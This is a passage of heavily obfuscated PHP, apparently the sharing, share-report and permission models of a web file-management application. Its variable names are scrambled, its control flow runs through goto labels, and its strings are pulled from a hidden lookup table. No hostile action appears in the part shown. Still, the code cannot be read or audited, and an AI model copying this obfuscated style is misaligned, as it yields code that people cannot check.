= array(); foreach ($D‚Ï’½‹ƒó as $C½™¶™ˆ¢) { $Aš‡¤¡†ŞÓ = SourceModel::TYPE_USER; if ($C½™¶™ˆ¢[$FÅŸÍîç¡¨[371]] == SourceModel::TYPE_GROUP) { $Aš‡¤¡†ŞÓ = SourceModel::TYPE_GROUP; } $A×»ê¸¶éÂ = array($FÅŸÍîç¡¨[441] => $EƒÇ´¶à‹¬, $FÅŸÍîç¡¨[371] => $Aš‡¤¡†ŞÓ, $FÅŸÍîç¡¨[456] => intval($C½™¶™ˆ¢[$FÅŸÍîç¡¨[456]]), $FÅŸÍîç¡¨[2228] => 0, $FÅŸÍîç¡¨[2229] => -1); if ($C½™¶™ˆ¢[$FÅŸÍîç¡¨[2228]]) { $A×»ê¸¶éÂ[$FÅŸÍîç¡¨[2228]] = $C½™¶™ˆ¢[$FÅŸÍîç¡¨[2228]]; } else { if ($C½™¶™ˆ¢[$FÅŸÍîç¡¨[2229]]) { $A×»ê¸¶éÂ[$FÅŸÍîç¡¨[2229]] = $C½™¶™ˆ¢[$FÅŸÍîç¡¨[2229]]; } } $Cğ¨ÍÅÙ‘™[] = $A×»ê¸¶éÂ; } goto a¤ÓİŞ¬çï; d˜Â¨«’ƒÆ: } public function numViewAdd($A™ƒŞïñ•‘) { $E¤¤¬«Ü¤ =& $_SERVER[Î¿—”òá]; $E‹‰­‚¼Ğï = array($E¤¤¬«Ü¤[440] => $A™ƒŞïñ•‘); $this->where($E‹‰­‚¼Ğï)->setAdd($E¤¤¬«Ü¤[2223]); } public function numDownloadAdd($aº¹åñ›æŸ) { $E£Š¯Òæ†” =& $_SERVER[Î¿—”òá]; $b×”¡¨”ÂŒ = array($E£Š¯Òæ†”[440] => $aº¹åñ›æŸ); $this->where($b×”¡¨”ÂŒ)->setAdd($E£Š¯Òæ†”[2224]); } protected function shareEdit($d‘ô”¯Œ½Â, $EáêïÙ¬ŞŠ) { goto c—Æ Ò°ëá; eˆõ¸ˆª´©: foreach ($C§©™È•Á£ as $E‹±Š¸ï£) { if (!array_key_exists($E‹±Š¸ï£, $EáêïÙ¬ŞŠ)) { continue; } $c©” ¶÷Òµ[$E‹±Š¸ï£] = $EáêïÙ¬ŞŠ[$E‹±Š¸ï£]; } $this->shareEventAdd($AÛÂ»´¶‹²[$a…ßùƒ‘á[369]], $EáêïÙ¬ŞŠ, $a…ßùƒ‘á[2064]); $this->where(array($a…ßùƒ‘á[440] => $d‘ô”¯Œ½Â))->save($c©” ¶÷Òµ); goto Bš„ñªİÅ; Bš„ñªİÅ: if (isset($EáêïÙ¬ŞŠ[$a…ßùƒ‘á[2216]])) { $this->_shareAuthSet($d‘ô”¯Œ½Â, $EáêïÙ¬ŞŠ[$a…ßùƒ‘á[2216]]); } return !0; goto D‘Íé°™Ñ©; d÷Ñ‰åí§’: $this->_checkLinkShare($EáêïÙ¬ŞŠ, $AÛÂ»´¶‹²); $c©” ¶÷Òµ = array(); $C§©™È•Á£ = explode($a…ßùƒ‘á[47], $a…ßùƒ‘á[2230]); goto eˆõ¸ˆª´©; c—Æ Ò°ëá: $a…ßùƒ‘á =& $_SERVER[Î¿—”òá]; $AÛÂ»´¶‹² = $this->getInfo($d‘ô”¯Œ½Â); if (!$AÛÂ»´¶‹²) { return !1; } goto d÷Ñ‰åí§’; D‘Íé°™Ñ©: } private function _checkLinkShare($DŞ“ŸÕˆ³•, $FĞÇµÁÀ£Á) { goto a‰Î¼»°³; e÷‹Ç„’’: if ($FĞÇµÁÀ£Á[$ašÈ×¯İÑñ[391]][$ašÈ×¯İÑñ[29]] != $ašÈ×¯İÑñ[167]) { $FÎ³Ş¿¥Á› = $this->_folderReport($bÈñóåÓ‡); if (!$FÎ³Ş¿¥Á›) { return; } show_json(LNG($ašÈ×¯İÑñ[2231]) . $ašÈ×¯İÑñ[2232] . $FÎ³Ş¿¥Á›, !1); } $C´œÆõ¨° = Model($ašÈ×¯İÑñ[749])->fileInfoGet($FĞÇµÁÀ£Á[$ašÈ×¯İÑñ[391]][$ašÈ×¯İÑñ[369]]); if (!$C´œÆõ¨°) { return; } goto C£À†ÍñßÖ; a‰Î¼»°³: $ašÈ×¯İÑñ =& $_SERVER[Î¿—”òá]; if ($DŞ“ŸÕˆ³•[$ašÈ×¯İÑñ[446]] != $ašÈ×¯İÑñ[83]) { return; } $bÈñóåÓ‡ = $FĞÇµÁÀ£Á[$ašÈ×¯İÑñ[391]][$ašÈ×¯İÑñ[369]]; goto e÷‹Ç„’’; C£À†ÍñßÖ: $A’Åø‡ó–Ë = $this->shareFileMeta($C´œÆõ¨°[$ašÈ×¯İÑñ[419]]); if (isset($A’Åø‡ó–Ë[$ašÈ×¯İÑñ[359]]) && $A’Åø‡ó–Ë[$ašÈ×¯İÑñ[359]] == $ašÈ×¯İÑñ[83]) { show_json(LNG($ašÈ×¯İÑñ[2233]), !1); } goto e“·‘Š™’æ; e“·‘Š™’æ: } private function _folderReport($bŞ­âÓÆğŒ) { goto bòÚš¹ß°²; AŒ¥†‚ª¢„: $E…çÖ˜Î² = array_to_keyvalue($CÛ‘ÔÈ¿†´, $cÓğ¯ˆ–á‡[33], $cÓğ¯ˆ–á‡[28]); $E…çÖ˜Î²[] = $C†¡£¼Œ¹Ì[$cÓğ¯ˆ–á‡[28]]; return implode($cÓğ¯ˆ–á‡[8], $E…çÖ˜Î²); goto eì¹´Ü¬¢À; dñÖî©¥¯„: if (!$A¡—Àõ‡) { return !1; } $A¡—Àõ‡ = array_to_keyvalue($A¡—Àõ‡, $cÓğ¯ˆ–á‡[33], $cÓğ¯ˆ–á‡[419]); $C¥Ê¥²¡Î¦ = $cÓğ¯ˆ–á‡[47] . $bŞ­âÓÆğŒ . $cÓğ¯ˆ–á‡[47]; goto b¢ÏŒ–­“; E—œßù¿ˆŠ: $aç° ˜²†¬ = substr($C†¡£¼Œ¹Ì[$cÓğ¯ˆ–á‡[459]], strpos($C†¡£¼Œ¹Ì[$cÓğ¯ˆ–á‡[459]], $C¥Ê¥²¡Î¦)); $a‡««äÆµÂ = array($cÓğ¯ˆ–á‡[369] => array($cÓğ¯ˆ–á‡[7], trim($aç° ˜²†¬, $cÓğ¯ˆ–á‡[47]))); $CÛ‘ÔÈ¿†´ = Model($cÓğ¯ˆ–á‡[749])->where($a‡««äÆµÂ)->field($cÓğ¯ˆ–á‡[28])->select(); goto AŒ¥†‚ª¢„; bòÚš¹ß°²: $cÓğ¯ˆ–á‡ =& $_SERVER[Î¿—”òá]; $a‡««äÆµÂ = array($cÓğ¯ˆ–á‡[419] => array($cÓğ¯ˆ–á‡[919], 0), $cÓğ¯ˆ–á‡[685] => 3); $A¡—Àõ‡ = Model($cÓğ¯ˆ–á‡[2234])->where($a‡««äÆµÂ)->field($cÓğ¯ˆ–á‡[419])->select(); goto dñÖî©¥¯„; b¢ÏŒ–­“: $a‡««äÆµÂ = array($cÓğ¯ˆ–á‡[419] => array($cÓğ¯ˆ–á‡[7], $A¡—Àõ‡), $cÓğ¯ˆ–á‡[459] => array($cÓğ¯ˆ–á‡[748], "\x25{$C¥Ê¥²¡Î¦}\45"), $cÓğ¯ˆ–á‡[397] => 0); $C†¡£¼Œ¹Ì = Model($cÓğ¯ˆ–á‡[749])->where($a‡««äÆµÂ)->field($cÓğ¯ˆ–á‡[2235])->find(); if (!$C†¡£¼Œ¹Ì) { return !1; } goto E—œßù¿ˆŠ; eì¹´Ü¬¢À: } protected function remove($bëÕƒ£Ñé) { goto d°‹‡æŞº; d°‹‡æŞº: $F›İ´šãå¯ =& $_SERVER[Î¿—”òá]; if (is_array($bëÕƒ£Ñé)) { $bëÕƒ£Ñé = array($F›İ´šãå¯[7], $bëÕƒ£Ñé); } $f™ôÜ×±¦ = array($F›İ´šãå¯[441] => $bëÕƒ£Ñé); goto AùŞÃ¯§ñÚ; D…ƒ‘Øµ†Ï: for ($e’Ê¬°·÷ = 0; $e’Ê¬°·÷ < count($cÎùÌ„»õË); $e’Ê¬°·÷++) { $bºæ‰¬—ä = $this->getInfo($cÎùÌ„»õË[$e’Ê¬°·÷]); if ($bºæ‰¬—ä[$F›İ´šãå¯[448]] == $F›İ´šãå¯[83]) { Model($F›İ´šãå¯[505])->eventShare($bºæ‰¬—ä[$F›İ´šãå¯[369]], $F›İ´šãå¯[2221]); } if ($bºæ‰¬—ä[$F›İ´šãå¯[446]] == $F›İ´šãå¯[83]) { Model($F›İ´šãå¯[505])->eventShare($bºæ‰¬—ä[$F›İ´šãå¯[369]], $F›İ´šãå¯[2220]); } } return $DËİ‹“ÍÖÑ; goto aî¤¸ˆ»÷Ø; AùŞÃ¯§ñÚ: $DËİ‹“ÍÖÑ = $this->where($f™ôÜ×±¦)->delete(); if ($DËİ‹“ÍÖÑ) { Model($F›İ´šãå¯[537])->where(array($F›İ´šãå¯[441] => $bëÕƒ£Ñé))->delete(); } $cÎùÌ„»õË = is_array($bëÕƒ£Ñé) ? $bëÕƒ£Ñé[1] : array($bëÕƒ£Ñé); goto D…ƒ‘Øµ†Ï; aî¤¸ˆ»÷Ø: } protected function removeBySource($c£ÂÊÊ÷®Û) { goto dô¿İÕÄ¬»; AßÖ±Ò¤†œ: $this->where($a½† ÏòÜŠ)->delete(); Model($B®â‹šÂ[537])->where($a½† ÏòÜŠ)->delete(); goto Cõ‡¶”ÄÔ²; dô¿İÕÄ¬»: $B®â‹šÂ =& $_SERVER[Î¿—”òá]; $a½† ÏòÜŠ = array($B®â‹šÂ[383] => array($B®â‹šÂ[384], $c£ÂÊÊ÷®Û)); $e¸é‚Œ¬ = $this->field($B®â‹šÂ[441])->where($a½† ÏòÜŠ)->select(); goto aÈ‹åØ¯Ô—; aÈ‹åØ¯Ô—: $e¸é‚Œ¬ = array_to_keyvalue($e¸é‚Œ¬, $B®â‹šÂ[33], $B®â‹šÂ[441]); if (!$e¸é‚Œ¬) { return; } $a½† ÏòÜŠ = array($B®â‹šÂ[440] => array($B®â‹šÂ[384], $e¸é‚Œ¬)); goto AßÖ±Ò¤†œ; Cõ‡¶”ÄÔ²: } public function listAll($Dô«²ºš) { goto BğÅäĞÌØÁ; EœÒóë‡æ÷: if ($Dô«²ºš[$b¿…œ®Ô Á[698]]) { $cŸù¸„„¬ = $Dô«²ºš[$b¿…œ®Ô Á[699]] ? $Dô«²ºš[$b¿…œ®Ô Á[699]] : strtotime(date($b¿…œ®Ô Á[2236])); $aí­Œ’Ê¡[$b¿…œ®Ô Á[187]] = array($b¿…œ®Ô Á[321], array($Dô«²ºš[$b¿…œ®Ô Á[698]], $cŸù¸„„¬)); } if ($Dô«²ºš[$b¿…œ®Ô Á[29]]) { $aí­Œ’Ê¡[$Dô«²ºš[$b¿…œ®Ô Á[29]]] = 1; } else { $aí­Œ’Ê¡[] = array($b¿…œ®Ô Á[446] => array($b¿…œ®Ô Á[919], 0), $b¿…œ®Ô Á[448] => array($b¿…œ®Ô Á[919], 0), $b¿…œ®Ô Á[2211] => $b¿…œ®Ô Á[2179]); } if ($Dô«²ºš[$b¿…œ®Ô Á[2175]]) { $aí­Œ’Ê¡[] = array($b¿…œ®Ô Á[443] => $Dô«²ºš[$b¿…œ®Ô Á[2175]], $b¿…œ®Ô Á[1335] => array($b¿…œ®Ô Á[748], "\45{$Dô«²ºš[$b¿…œ®Ô Á[2175]]}\45"), $b¿…œ®Ô Á[2211] => $b¿…œ®Ô Á[2179]); } goto FÃ™ë¬ëî; FÃ™ë¬ëî: $D°º²“ÓØ = $this->_makeOrder()->where($aí­Œ’Ê¡)->selectPage(20); if (empty($D°º²“ÓØ[$b¿…œ®Ô Á[354]])) { return array(); } $this->_listDataApply($D°º²“ÓØ[$b¿…œ®Ô Á[354]]); goto EöèƒíğÎ; BğÅäĞÌØÁ: $b¿…œ®Ô Á =& $_SERVER[Î¿—”òá]; $aí­Œ’Ê¡ = array(); if ($Dô«²ºš[$b¿…œ®Ô Á[1429]]) { $aí­Œ’Ê¡[$b¿…œ®Ô Á[1429]] = $Dô«²ºš[$b¿…œ®Ô Á[1429]]; } goto EœÒóë‡æ÷; EöèƒíğÎ: return $D°º²“ÓØ; goto D¿ù²šÑ©; D¿ù²šÑ©: } public function listDataApply($Bô•Ë‚Û) { $this->_listDataApply($Bô•Ë‚Û); return $Bô•Ë‚Û; } private function _listDataApply(&$DÄêˆšøó) { $C¶ï âÅˆ” =& $_SERVER[Î¿—”òá]; $Cå‰„íö×‰ = array_to_keyvalue($DÄêˆšøó, $C¶ï âÅˆ”[33], $C¶ï âÅˆ”[1429]); $dæèŞÏ©Ë˜ = Model($C¶ï âÅˆ”[477])->userListInfo(array_unique($Cå‰„íö×‰)); $a­ŞèÜ°‹ = array_to_keyvalue($DÄêˆšøó, $C¶ï âÅˆ”[33], $C¶ï âÅˆ”[369]); $Dõô…Š¨åÎ = Model($C¶ï âÅˆ”[749])->sourceListInfo($a­ŞèÜ°‹, !0); foreach ($DÄêˆšøó as &$f³Š¥¥½Ğ©) { $FÊ»ÈĞ¢±¯ = $f³Š¥¥½Ğ©[$C¶ï âÅˆ”[1429]]; $f³Š¥¥½Ğ©[$C¶ï âÅˆ”[2237]] = $dæèŞÏ©Ë˜[$FÊ»ÈĞ¢±¯] ? $dæèŞÏ©Ë˜[$FÊ»ÈĞ¢±¯] : !1; $cñî¼„Ñíá = $f³Š¥¥½Ğ©[$C¶ï âÅˆ”[369]]; $f³Š¥¥½Ğ©[$C¶ï âÅˆ”[391]] = $Dõô…Š¨åÎ[$cñî¼„Ñíá] ? $Dõô…Š¨åÎ[$cñî¼„Ñíá] : !1; } } private function _makeOrder($d…¥”éÁà„ = '') { goto eí—°õÓ§“; E‚ÓêÚ²†: $aƒ¡öæ¬³Ä = Input::get($AÜ¿ø´·¾[407], $AÜ¿ø´·¾[7], $AÜ¿ø´·¾[389], $fíò±‡­ğÃ); $aœàãá¿æ = Input::get($AÜ¿ø´·¾[408], $AÜ¿ø´·¾[7], $AÜ¿ø´·¾[2238], array($AÜ¿ø´·¾[2174], $AÜ¿ø´·¾[404])); $aœàãá¿æ = $aÉÙø¢ÀÈ[$aœàãá¿æ]; goto BÕêÌ®êÁ; BÕêÌ®êÁ: $d…¥”éÁà„ = $d…¥”éÁà„ . "{$aƒ¡öæ¬³Ä}\40{$aœàãá¿æ}"; return $this->order($d…¥”éÁà„); goto D„Áí„øÁ; eí—°õÓ§“: $AÜ¿ø´·¾ =& $_SERVER[Î¿—”òá]; $fíò±‡­ğÃ = array($AÜ¿ø´·¾[187], $AÜ¿ø´·¾[699], $AÜ¿ø´·¾[2223], $AÜ¿ø´·¾[2224]); $aÉÙø¢ÀÈ = array($AÜ¿ø´·¾[402] => $AÜ¿ø´·¾[403], $AÜ¿ø´·¾[404] => $AÜ¿ø´·¾[405]); goto E‚ÓêÚ²†; D„Áí„øÁ: } public function reportAdd($Cí©ˆƒ·Áí) { $Aƒ¥ÍôŠé¹ =& $_SERVER[Î¿—”òá]; $f¢…“ÏÒ†Á = array($Aƒ¥ÍôŠé¹[441] => $Cí©ˆƒ·Áí[$Aƒ¥ÍôŠé¹[441]], $Aƒ¥ÍôŠé¹[1429] => USER_ID); if (Model($Aƒ¥ÍôŠé¹[2234])->where($f¢…“ÏÒ†Á)->find()) { return !1; } $a‹ÎØãê = array($Aƒ¥ÍôŠé¹[441] => $Cí©ˆƒ·Áí[$Aƒ¥ÍôŠé¹[441]], $Aƒ¥ÍôŠé¹[1335] => $Cí©ˆƒ·Áí[$Aƒ¥ÍôŠé¹[1335]], $Aƒ¥ÍôŠé¹[369] => $Cí©ˆƒ·Áí[$Aƒ¥ÍôŠé¹[369]], $Aƒ¥ÍôŠé¹[419] => $Cí©ˆƒ·Áí[$Aƒ¥ÍôŠé¹[419]], $Aƒ¥ÍôŠé¹[1429] => USER_ID, $Aƒ¥ÍôŠé¹[29] => $Cí©ˆƒ·Áí[$Aƒ¥ÍôŠé¹[29]], $Aƒ¥ÍôŠé¹[405] => $Cí©ˆƒ·Áí[$Aƒ¥ÍôŠé¹[405]]); return Model($Aƒ¥ÍôŠé¹[2234])->add($a‹ÎØãê); } public function reportList($Eš¼‘ºÄìŸ) { goto Bîæè‡…‘¡; Bîæè‡…‘¡: $A±„³Ùó›“ =& $_SERVER[Î¿—”òá]; $c·Õ‘ßÁ‡¼ = array(); if ($Eš¼‘ºÄìŸ[$A±„³Ùó›“[698]]) { $AóóÃĞ»É® = $Eš¼‘ºÄìŸ[$A±„³Ùó›“[699]] ? $Eš¼‘ºÄìŸ[$A±„³Ùó›“[699]] : strtotime(date($A±„³Ùó›“[2236])); $c·Õ‘ßÁ‡¼[$A±„³Ùó›“[187]] = array($A±„³Ùó›“[321], array($Eš¼‘ºÄìŸ[$A±„³Ùó›“[698]], $AóóÃĞ»É®)); } goto FÒ·£¢¼¾é; FÒ·£¢¼¾é: if (isset($Eš¼‘ºÄìŸ[$A±„³Ùó›“[29]]) && in_array($Eš¼‘ºÄìŸ[$A±„³Ùó›“[29]], array($A±„³Ùó›“[83], $A±„³Ùó›“[2239], $A±„³Ùó›“[2240], $A±„³Ùó›“[2241], $A±„³Ùó›“[1912]))) { $c·Õ‘ßÁ‡¼[$A±„³Ùó›“[29]] = $Eš¼‘ºÄìŸ[$A±„³Ùó›“[29]]; } if (isset($Eš¼‘ºÄìŸ[$A±„³Ùó›“[685]]) && in_array($Eš¼‘ºÄìŸ[$A±„³Ùó›“[685]], array($A±„³Ùó›“[468], $A±„³Ùó›“[83], $A±„³Ùó›“[2239], $A±„³Ùó›“[2240]))) { $c·Õ‘ßÁ‡¼[$A±„³Ùó›“[685]] = $Eš¼‘ºÄìŸ[$A±„³Ùó›“[685]]; } $B¹¦Òœï = Input::get($A±„³Ùó›“[408], $A±„³Ùó›“[7], $A±„³Ùó›“[2238], array($A±„³Ùó›“[2174], $A±„³Ùó›“[404])); goto aìí‘Š¦¤š; aìí‘Š¦¤š: $eîÒ½…Ñ¿Ì = array($A±„³Ùó›“[402] => $A±„³Ùó›“[403], $A±„³Ùó›“[404] => $A±„³Ùó›“[405]); $dÓ†ğŒ’š = $A±„³Ùó›“[2242] . $eîÒ½…Ñ¿Ì[$B¹¦Òœï]; $dÏëµ©¢Ô = Model($A±„³Ùó›“[2234])->where($c·Õ‘ßÁ‡¼)->order($dÓ†ğŒ’š)->selectPage(20); goto eøùÆ•£³; eøùÆ•£³: if (empty($dÏëµ©¢Ô[$A±„³Ùó›“[354]])) { return array(); } $this->_listDataApply($dÏëµ©¢Ô[$A±„³Ùó›“[354]]); return $dÏëµ©¢Ô; goto AŠÕ¦”Êãø; AŠÕ¦”Êãø: } public function reportStatus($cÄÈÑ‰ÅáÚ) { goto e²‘±«‘•; E­–„˜Š™Ş: return $fˆ·ë˜‡Ï‘; goto Fğ±óÂ–Õò; EÕÃé¥Âí‡: $fˆ·ë˜‡Ï‘ = Model($EÛ°’£×©Û[2234])->where($C³‰„ä®©«)->save($E®¤®„—Åº); if ($cÄÈÑ‰ÅáÚ[$EÛ°’£×©Û[685]] == $EÛ°’£×©Û[2239]) { if ($CñŞ Ï³Š°[$EÛ°’£×©Û[419]] != $EÛ°’£×©Û[468] && $this->shareFileMeta($CñŞ Ï³Š°[$EÛ°’£×©Û[419]])) { $this->shareFileMeta($CñŞ Ï³Š°[$EÛ°’£×©Û[419]], 0); } $this->remove($CñŞ Ï³Š°[$EÛ°’£×©Û[441]]); return !0; } if ($fˆ·ë˜‡Ï‘ && $cÄÈÑ‰ÅáÚ[$EÛ°’£×©Û[685]] == $EÛ°’£×©Û[2240]) { $f‰§Ñ²¾Ğ = $E®¤®„—Åº[$EÛ°’£×©Û[685]] == $EÛ°’£×©Û[2240] ? 1 : 0; $this->shareFileMeta($CñŞ Ï³Š°[$EÛ°’£×©Û[419]], $f‰§Ñ²¾Ğ); $this->removeByFile($CñŞ Ï³Š°[$EÛ°’£×©Û[419]]); } goto E­–„˜Š™Ş; e²‘±«‘•: $EÛ°’£×©Û =& $_SERVER[Î¿—”òá]; $C³‰„ä®©« = array($EÛ°’£×©Û[367] => $cÄÈÑ‰ÅáÚ[$EÛ°’£×©Û[367]]); $CñŞ Ï³Š° = Model($EÛ°’£×©Û[2234])->where($C³‰„ä®©«)->field($EÛ°’£×©Û[2243])->find(); goto a™¬‚èºº; a™¬‚èºº: if (!$CñŞ Ï³Š°) { return !1; } $E®¤®„—Åº = array($EÛ°’£×©Û[685] => $cÄÈÑ‰ÅáÚ[$EÛ°’£×©Û[685]]); if ($cÄÈÑ‰ÅáÚ[$EÛ°’£×©Û[685]] == $EÛ°’£×©Û[2240] && $CñŞ Ï³Š°[$EÛ°’£×©Û[685]] == $EÛ°’£×©Û[2240]) { $E®¤®„—Åº[$EÛ°’£×©Û[685]] = 0; } goto EÕÃé¥Âí‡; Fğ±óÂ–Õò: } private function removeByFile($a‰«ØĞ™¬) { goto B²Ô³Ñó¿; aÉ²Ü¨”‹ö: $aßÈ–İáÃç = array($dÛ‡…â‰…â[369] => array($dÛ‡…â‰…â[7], $Dµ¬½â –›), $dÛ‡…â‰…â[446] => 1); $bç‘‡ÜŒä = Model($dÛ‡…â‰…â[2074])->where($aßÈ–İáÃç)->field($dÛ‡…â‰…â[441])->select(); if (empty($bç‘‡ÜŒä)) { return; } goto dîõ´«áÅ¡; dîõ´«áÅ¡: $cĞåè„öË  = array_to_keyvalue($bç‘‡ÜŒä, $dÛ‡…â‰…â[33], $dÛ‡…â‰…â[441]); $this->remove($cĞåè„öË ); goto DÉŞ§Œ„Ÿ; B²Ô³Ñó¿: $dÛ‡…â‰…â =& $_SERVER[Î¿—”òá]; $bç‘‡ÜŒä = Model($dÛ‡…â‰…â[749])->where(array($dÛ‡…â‰…â[419] => $a‰«ØĞ™¬))->field($dÛ‡…â‰…â[369])->select(); $Dµ¬½â –› = array_to_keyvalue($bç‘‡ÜŒä, $dÛ‡…â‰…â[33], $dÛ‡…â‰…â[369]); goto aÉ²Ü¨”‹ö; DÉŞ§Œ„Ÿ: } private function shareFileMeta($bŞ¼— Ê‹, $Fß»Ç¦ÑÅ– = null) { $b±˜·ç£‰ =& $_SERVER[Î¿—”òá]; $bù‚˜ë…Åç = array($b±˜·ç£‰[419] => $bŞ¼— Ê‹, $b±˜·ç£‰[89] => $b±˜·ç£‰[2244]); if (is_null($Fß»Ç¦ÑÅ–)) { return Model($b±˜·ç£‰[2245])->where($bù‚˜ë…Åç)->find(); } $bù‚˜ë…Åç[$b±˜·ç£‰[359]] = $Fß»Ç¦ÑÅ–; Model($b±˜·ç£‰[2245])->add($bù‚˜ë…Åç, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\162\x63\145\137\x61\165\x74\150"; public function getAuth($F¥’ŒØ±‘ï) { goto f´Æµ»ÌÒ; fëê–… í: return $aÖÍ•™ªºâ; goto AÄÅä‹ù¶¬; a§Šòº­ÀÔ: $Aœ ­¤‘Û = $this->field($F‡ï©ÊÈ„×)->order($dÃ×îñÁ´î[367])->where($FºÔîÍìñÆ)->select(); $aÖÍ•™ªºâ = array(); foreach ($Aœ ­¤‘Û as $Bà‹ÉÈ‚ª) { if (Model($dÃ×îñÁ´î[2247])->listData($Bà‹ÉÈ‚ª[$dÃ×îñÁ´î[2228]])) { $aÖÍ•™ªºâ[] = $Bà‹ÉÈ‚ª; } } goto fëê–… í; f´Æµ»ÌÒ: $dÃ×îñÁ´î =& $_SERVER[Î¿—”òá]; $F‡ï©ÊÈ„× = $dÃ×îñÁ´î[2246]; $FºÔîÍìñÆ = array($dÃ×îñÁ´î[369] => $F¥’ŒØ±‘ï); goto a§Šòº­ÀÔ; AÄÅä‹ù¶¬: } public function setAuth($B‰ªç¯ÛÈ, $A®¿î®±¨) { goto døµ¶Ä”‰À; eêŞğ¤õ‚¿: $this->where(array($fÙçÈÁŸ[383] => $B‰ªç¯ÛÈ))->delete(); $this->addAll($C²ÜÚ¾¶†›); return !0; goto fÏåÌë¨Š; A™–Â„ãÂà: $d„ŸÖÖ‰ = 1; $eÚĞĞßÁÊØ = $dÙ³‘°Ü„¢[$fÙçÈÁŸ[456]]; if ($eÚĞĞßÁÊØ != $d„ŸÖÖ‰) { $Dä†õ‹Ú× = array($fÙçÈÁŸ[2097] => $eÚĞĞßÁÊØ); $Fò³ßº–²ó = Model($fÙçÈÁŸ[2173])->field($fÙçÈÁŸ[1429])->where($Dä†õ‹Ú×)->select(); $Fò³ßº–²ó = array_to_keyvalue($Fò³ßº–²ó, $fÙçÈÁŸ[33], $fÙçÈÁŸ[1429]); } goto eÈ¦…Œ˜» ; eÈ¦…Œ˜» : $C‘÷²Ãùˆ² = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $C²ÜÚ¾¶†› = array(); foreach ($A®¿î®±¨ as $b¯¾´ª‹ˆÃ) { if (!in_array($b¯¾´ª‹ˆÃ[$fÙçÈÁŸ[371]], $C‘÷²Ãùˆ²)) { show_json(LNG($fÙçÈÁŸ[2248]), !1); } if ($eÚĞĞßÁÊØ != $d„ŸÖÖ‰) { if ($b¯¾´ª‹ˆÃ[$fÙçÈÁŸ[371]] == SourceModel::TYPE_GROUP) { } if ($b¯¾´ª‹ˆÃ[$fÙçÈÁŸ[456]] != 0 && !in_array($b¯¾´ª‹ˆÃ[$fÙçÈÁŸ[456]], $Fò³ßº–²ó)) { } } if ($b¯¾´ª‹ˆÃ[$fÙçÈÁŸ[456]] == 0) { $b¯¾´ª‹ˆÃ[$fÙçÈÁŸ[371]] = SourceModel::TYPE_USER; } $C²ÜÚ¾¶†›[] = array($fÙçÈÁŸ[369] => $B‰ªç¯ÛÈ, $fÙçÈÁŸ[371] => intval($b¯¾´ª‹ˆÃ[$fÙçÈÁŸ[371]]), $fÙçÈÁŸ[456] => intval($b¯¾´ª‹ˆÃ[$fÙçÈÁŸ[456]]), $fÙçÈÁŸ[2228] => intval($b¯¾´ª‹ˆÃ[$fÙçÈÁŸ[2228]]) ? intval($b¯¾´ª‹ˆÃ[$fÙçÈÁŸ[2228]]) : 0, $fÙçÈÁŸ[2229] => intval($b¯¾´ª‹ˆÃ[$fÙçÈÁŸ[2229]]) ? intval($b¯¾´ª‹ˆÃ[$fÙçÈÁŸ[2229]]) : -1); } goto eêŞğ¤õ‚¿; døµ¶Ä”‰À: $fÙçÈÁŸ =& $_SERVER[Î¿—”òá]; $dÙ³‘°Ü„¢ = Model($fÙçÈÁŸ[1110])->sourceInfo($B‰ªç¯ÛÈ); if ($dÙ³‘°Ü„¢[$fÙçÈÁŸ[371]] != SourceModel::TYPE_GROUP) { return !1; } goto A™–Â„ãÂà; fÏåÌë¨Š: } public function authClear($BóÊ’ä¥£„) { $a½ÀÆ‹ùÏ¯ =& $_SERVER[Î¿—”òá]; $e£«Ú’‘©‰ = Model($a½ÀÆ‹ùÏ¯[1110])->sourceInfo($BóÊ’ä¥£„); $cÍÒ¨‡´¯Ç = array($BóÊ’ä¥£„); if ($e£«Ú’‘©‰[$a½ÀÆ‹ùÏ¯[370]] == $a½ÀÆ‹ùÏ¯[83]) { $bïÎ¡ä®Çˆ = array($a½ÀÆ‹ùÏ¯[525] => array($a½ÀÆ‹ùÏ¯[483], $e£«Ú’‘©‰[$a½ÀÆ‹ùÏ¯[459]] . $BóÊ’ä¥£„ . $a½ÀÆ‹ùÏ¯[484])); $cÍÒ¨‡´¯Ç = Model($a½ÀÆ‹ùÏ¯[1110])->field($a½ÀÆ‹ùÏ¯[383])->where($bïÎ¡ä®Çˆ)->getField($a½ÀÆ‹ùÏ¯[369], !0); $cÍÒ¨‡´¯Ç[] = $BóÊ’ä¥£„; } $this->where(array($a½ÀÆ‹ùÏ¯[383] => array($a½ÀÆ‹ùÏ¯[384], $cÍÒ¨‡´¯Ç)))->delete(); return !0; } public function get($dëÇÑ±¬Ü) { $Fêà­èæ· = $this->getSourceList(array($dëÇÑ±¬Ü), !0); return $Fêà­èæ·[0]; } public function getSourceList($d³Îœİ·‹, $aĞˆº‰Õ = false) { goto D¹ÇÌÎ Ú™; aù†áÎôá¡: if (!$aĞˆº‰Õ) { $BÕ×‰Ù˜œù = array($aŒµ„¹–Ê[383] => array($aŒµ„¹–Ê[384], $d³Îœİ·‹)); $aĞˆº‰Õ = $fºÉˆŠÔ†Ë->field($aŒµ„¹–Ê[2249])->where($BÕ×‰Ù˜œù)->select(); $aĞˆº‰Õ = array_to_keyvalue($aĞˆº‰Õ, $aŒµ„¹–Ê[369]); } $EƒŒğ¡«µæ = $d³Îœİ·‹; foreach ($aĞˆº‰Õ as $BÉ¤»¾¯îå => $Eƒª£‡ï×ï) { $cÔˆ†Šåà× = $fºÉˆŠÔ†Ë->parentLevelArray($Eƒª£‡ï×ï[$aŒµ„¹–Ê[459]]); $EƒŒğ¡«µæ = array_merge($EƒŒğ¡«µæ, $cÔˆ†Šåà×, array($BÉ¤»¾¯îå)); } goto CÎ„òÅ‚›¥; E“Š®ÂâØ: $cÜáÍ§È» = array(); foreach ($aĞˆº‰Õ as $Cîº¸†‚„ã => $aÅì»ˆé‰°) { $cÜáÍ§È»[$Cîº¸†‚„ã] = $this->makeSourceAuth($aÅì»ˆé‰°, $AÔÂ¬Ó‡¯); } return $cÜáÍ§È»; goto F‹±ïù‰íğ; CÎ„òÅ‚›¥: $EƒŒğ¡«µæ = array_values(array_unique($EƒŒğ¡«µæ)); if (!$EƒŒğ¡«µæ) { return array(); } $AôáÅß«¡ = $aŒµ„¹–Ê[2250]; goto b¿º°‡å›; b¿º°‡å›: $BÕ×‰Ù˜œù = array($aŒµ„¹–Ê[383] => array($aŒµ„¹–Ê[384], $EƒŒğ¡«µæ)); $AÔÂ¬Ó‡¯ = 